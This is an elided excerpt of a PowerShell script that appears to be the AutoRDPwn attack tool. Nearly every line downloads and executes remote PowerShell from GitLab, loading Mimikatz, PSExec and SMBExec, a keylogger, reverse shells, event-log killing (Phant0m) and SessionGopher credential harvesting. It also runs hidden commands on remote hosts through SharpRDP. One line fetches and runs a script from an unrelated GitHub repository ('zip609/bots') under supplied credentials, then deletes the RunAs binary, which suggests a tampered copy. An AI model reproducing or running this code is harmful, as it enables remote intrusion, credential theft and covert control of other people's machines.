...
if ($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/AutoBypass.ps1')}
if ($local){ Import-Module $localpath\Resources\Design\NinjaStyle.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Design/NinjaStyle.ps1')}
...
if ($local){ Import-Module $localpath\Resources\Design\Disable-Close.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Design/Disable-Close.ps1')}
if (!$local){ (New-object System.net.webclient).DownloadFile("https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Design/AutoRDPwn.ico","AutoRDPwn.ico")}
if (!$local){ (New-object System.net.webclient).DownloadFile("https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Design/Set-ConsoleIcon.ps1","Set-ConsoleIcon.ps1")}
...
function Remove-Exclusions { 
    ...
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()} ; switch ($input) {
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PSexec.ps1')}
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-SMBExec.ps1')}
        ...
        Invoke-SharpRDP "computername=$computer command=powershell.exe -windowstyle hidden $Pwn3 elevated=taskmgr" ; Write-Host
        Invoke-SharpRDP "computername=$computer command=powershell.exe -windowstyle hidden $Pwn4 elevated=taskmgr" }
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-Mimikatz.ps1')}
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-SharpWeb.ps1')}
        Invoke-Sharpweb all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-Portscan.ps1')}
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Get-NTLM.ps1')}
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Check-LocalAdminHash.ps1')}
        ...
        if ($local){ Import-Module .\Resources\Scripts\RDP-Caching.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/RDP-Caching.ps1')} ; explorer $env:temp\Recovered_RDP_Session
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard }
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/SessionGopher.ps1')}
        ...
        if ($local){ Import-Module .\Resources\Scripts\Chachi-Enumerator.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Chachi-Enumerator.ps1')}
        ...
        if ($local){ Import-Module .\Resources\Scripts\Sherlock.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Sherlock.ps1')}
        ...
        if ($local){ Import-Module .\Resources\Scripts\Invoke-PrivescCheck.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PrivescCheck.ps1')}
        ...
        if ($local){ Import-Module .\Resources\Scripts\Invoke-Phant0m.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-Phant0m.ps1')}
        ...
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-RunAs.ps1')}
        ...
        if (!$local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/zip609/bots/main/rdp.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1" ; del ./RunAs.exe ; exit }
   ...
   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
    ...
    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PipeShell.ps1')
    ...
    (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-VNCServer.ps1')}
    ...
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name LogonTimeout -Value 3600 -PropertyType DWord -Force 2>&1> $null }}
        ...
        if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-VNCViewer.ps1')}
        ...
        if($local){ Import-Module .\Resources\Scripts\Invoke-RDPwrap.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-RDPwrap.ps1')}
...
if ($webserver){ if($local){ Import-Module .\Resources\Scripts\Start-WebServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Start-WebServer.ps1')}
...
if ($netcat -in 'local'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
...
if ($netcat -in 'remote'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
...
if ($getkeys){ if($local){ Import-Module .\Resources\Scripts\Invoke-Keylogger.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-Keylogger.ps1')}
...
if ($smbshell){ Write-Host ; if($local){ Import-Module .\Resources\Scripts\Invoke-PipeShell.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-PipeShell.ps1')}
...
if($local){ Import-Module .\Resources\Scripts\Invoke-RevShellServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-RevShellServer.ps1')}
if($local){ Import-Module .\Resources\Scripts\Invoke-WebRev.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-WebRev.ps1')}
